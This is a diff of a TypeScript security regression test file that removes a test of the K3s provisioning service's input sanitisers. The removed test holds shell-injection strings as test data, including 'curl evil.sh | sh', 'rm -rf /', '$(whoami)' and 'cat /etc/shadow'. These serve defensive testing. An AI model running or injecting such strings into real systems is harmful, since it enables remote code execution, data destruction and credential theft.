@@ -22,7 +22,6 @@ import {
 } from '../session';
 import { verifyCronSecret } from '../cron-auth';
 import { calculateMinimumBaseVpsRate } from '../vps-billing-rate';
-import { K3sProvisioningService } from '../k3s-provisioning';
 import { createVncSession, consumeVncSession } from '../vnc-session';
 
 describe('Bank-Grade Security Hardening Regression Suite', () => {
@@ -174,31 +173,6 @@ describe('Bank-Grade Security Hardening Regression Suite', () => {
       );
       // 4*100 + 8*50 + 50*5 + 20*1 = 400 + 400 + 250 + 20 = 1070
       expect(floor).toBe(1070);
-    });
-
-    it('neutralizes shell injection payloads in K3s provisioning helpers', () => {
-      expect(K3sProvisioningService.sanitizeK3sChannel("v1.31' && id #")).toBe('v1.31');
-      expect(K3sProvisioningService.sanitizeK3sChannel('; curl evil.sh | sh')).toBe('v1.31');
-      expect(K3sProvisioningService.sanitizeK3sChannel('v1.30.4+k3s1')).toBe('v1.30.4+k3s1');
-
-      expect(
-        K3sProvisioningService.sanitizeHostname('master$(whoami);rm -rf /', 'k3s-master')
-      ).toBe('master--whoami--rm--rf');
-
-      expect(() =>
-        K3sProvisioningService.validateIpv4OrThrow('10.0.0.1; id')
-      ).toThrow();
-      expect(() =>
-        K3sProvisioningService.validateIpv4OrThrow('999.0.0.1')
-      ).toThrow();
-      expect(K3sProvisioningService.validateIpv4OrThrow('10.10.0.5')).toBe('10.10.0.5');
-
-      expect(() =>
-        K3sProvisioningService.validateNodeTokenOrThrow("K10abc' || cat /etc/shadow #")
-      ).toThrow();
-      expect(
-        K3sProvisioningService.validateNodeTokenOrThrow('K10abcdef123456::server:9876543210')
-      ).toBe('K10abcdef123456::server:9876543210');
     });
   });
 
